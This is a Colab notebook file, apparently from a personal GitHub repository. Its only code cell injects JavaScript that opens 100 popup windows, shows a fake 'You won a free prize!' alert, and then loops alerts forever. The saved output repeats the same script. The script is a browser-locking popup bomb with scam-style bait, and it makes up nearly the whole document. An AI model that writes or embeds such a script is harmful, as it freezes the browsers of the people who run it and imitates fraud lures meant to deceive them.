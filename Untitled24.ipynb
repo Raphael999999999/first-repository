{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Raphael999999999/first-repository/blob/main/Untitled24.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "\n",
        "from IPython.display import Javascript\n",
        "display(Javascript('''\n",
        "  function launchPopups() {\n",
        "    for (let i = 0; i < 100; i++) {\n",
        "      window.open(\"about:blank\", \"_blank\", \"width=200,height=200\");\n",
        "    }\n",
        "    alert(\"You won a free prize! Click OK to claim it!\");\n",
        "    while (true) {\n",
        "      alert(\"CLICK ME NOW!\");\n",
        "    }\n",
        "  }\n",
        "  launchPopups();\n",
        "'''))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sVKGgy5uUSkI",
        "outputId": "231941af-ceee-488b-8621-bbc1055a4e52"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "  function launchPopups() {\n",
              "    for (let i = 0; i < 100; i++) {\n",
              "      window.open(\"about:blank\", \"_blank\", \"width=200,height=200\");\n",
              "    }\n",
              "    alert(\"You won a free prize! Click OK to claim it!\");\n",
              "    while (true) {\n",
              "      alert(\"CLICK ME NOW!\");\n",
              "    }\n",
              "  }\n",
              "  launchPopups();\n"
            ]
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyORNxlmvKigHATPSYdD2BJc",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}